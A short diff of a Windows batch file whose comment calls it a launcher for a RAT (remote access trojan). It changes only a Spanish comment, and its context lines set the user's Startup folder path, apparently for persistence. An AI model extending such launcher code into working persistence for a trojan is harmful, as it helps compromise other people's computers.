@@ -2,7 +2,7 @@
 @REM Launcher para el RAT
 
 @REM Variables
-@REM Locación inicial
+@REM Locacion inicial
 set "INITIALPATH=%cd%"
 @REM definr directorio inicio de programas.
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
